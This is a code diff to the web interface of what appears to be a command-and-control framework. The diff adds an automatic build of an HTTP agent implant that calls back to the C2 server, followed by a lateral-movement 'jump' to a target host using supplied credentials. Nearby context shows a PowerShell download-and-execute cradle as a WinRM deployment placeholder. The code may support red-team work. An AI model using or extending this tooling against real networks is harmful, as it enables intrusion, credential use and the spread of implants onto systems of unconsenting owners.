@@ -3246,12 +3246,14 @@ async function runCtxAction(act) {
       } else if (method === 'winrm-deploy') {
         extraFields = [{key:'cradle', label:'PowerShell cradle', ph:'IEX(New-Object Net.WebClient).DownloadString(...)'}];
       } else {
+        // "Build new (auto)" option builds an HTTP agent on the fly, same as SMB pivot
+        const autoBuildItem = {v:'', l:'🆕 Build new (auto)'};
         extraFields = [{key:'payload', label:'Payload', type:'select-grouped', groups:[
-          {label:'🎯 Agent Payloads', items: payloadGroup},
+          {label:'🎯 Agent Payloads', items: [autoBuildItem, ...payloadGroup]},
         ]}];
       }
 
-      showQuickForm(`⚡ ${labels[method]||method}`, [...baseFields, ...extraFields], vals => {
+      showQuickForm(`⚡ ${labels[method]||method}`, [...baseFields, ...extraFields], async vals => {
         if (!vals.host) { toast('Host required','red'); return; }
         let cmdLine;
         if (method === 'winrm-exec') {
@@ -3259,10 +3261,40 @@ async function runCtxAction(act) {
         } else if (method === 'winrm-deploy') {
           cmdLine = `winrm deploy ${vals.host} ${vals.user} ${vals.pass} ${vals.cradle}`;
         } else {
-          if (!vals.payload) { toast('Select a payload','red'); return; }
-          cmdLine = `jump ${method} ${vals.host} ${vals.payload} ${vals.user} ${vals.pass}`;
+          let payloadName = vals.payload;
+          // Auto-build: generate a fresh HTTP agent payload for this jump
+          if (!payloadName) {
+            const suffix = Math.random().toString(16).slice(2, 8);
+            const isSSH  = method === 'ssh';
+            const fmt    = isSSH ? 'elf' : 'exe';
+            const outName = `agent_jump_${suffix}.${fmt}`;
+            const c2host  = c2IPs[0] || (() => { try { return new URL(BASE).hostname; } catch(e) { return '127.0.0.1'; } })();
+            const serverURL = `http://${c2host}:8080`;
+            openConsoleFor(aid);
+            addConsoleOutputForAgent(aid, `[jump] Building ${outName} → ${serverURL}…`, '', null);
+            const buildR = await api('POST', '/api/build', {
+              format: fmt, transport: 'http',
+              server_url: serverURL,
+              sleep_sec: agnt?.sleep_sec || 5, jitter_pct: agnt?.jitter_pct ?? 10,
+              output_name: outName,
+            });
+            if (!buildR?.ok) {
+              addConsoleOutputForAgent(aid, '', `[jump] ✗ Build failed: ${buildR?.error||'error'}`, null);
+              return;
+            }
+            payloadName = outName;
+            addConsoleOutputForAgent(aid, `[jump] ✓ Payload ready: ${payloadName}`, '', null);
+          } else {
+            openConsoleFor(aid);
+          }
+          cmdLine = `jump ${method} ${vals.host} ${payloadName} ${vals.user} ${vals.pass}`;
+          // Register lateral watcher so new agent gets parent_id in graph
+          _lateralWatchers[vals.host] = {
+            parentID: aid,
+            knownIds: new Set(agents.map(a => a.id)),
+            expiry:   Date.now() + 300000,
+          };
         }
-        openConsoleFor(aid);
         setTimeout(() => dispatchConsoleCmd(aid, cmdLine), 350);
       });
       break;
